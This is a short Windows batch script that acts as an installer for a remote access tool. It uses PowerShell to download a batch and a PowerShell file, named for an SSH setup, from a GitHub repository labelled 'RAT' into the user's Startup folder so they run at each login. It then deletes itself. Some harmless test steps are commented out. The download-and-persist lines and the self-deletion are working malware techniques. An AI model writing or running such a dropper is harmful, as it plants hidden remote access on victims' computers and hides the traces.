@echo off
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

REM 1. Create testing.txt in Startup folder
REM echo This is a test file. > "%startupFolder%\testing.txt"

REM 2. Download the payload and Name it
REM powershell -Command "Invoke-WebRequest -Uri 'https://freetestdata.com/wp-content/uploads/2021/09/500kb.png' -OutFile '%startupFolder%\image.png'"

powershell -Command "Invoke-WebRequest -Uri 'https://github.com/RevoVog/RAT/blob/main/payload/setup-ssh-temp.bat' -OutFile '%startupFolder%\setup-ssh-temp.bat'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/RevoVog/RAT/blob/main/payload/setup-ssh-temp.ps1' -OutFile '%startupFolder%\setup-ssh-temp.ps1'"

echo start "" "%%startupFolder%%\setup-ssh-temp.bat"

REM 4. Self delete installer file
start "" cmd /c del "%~f0"
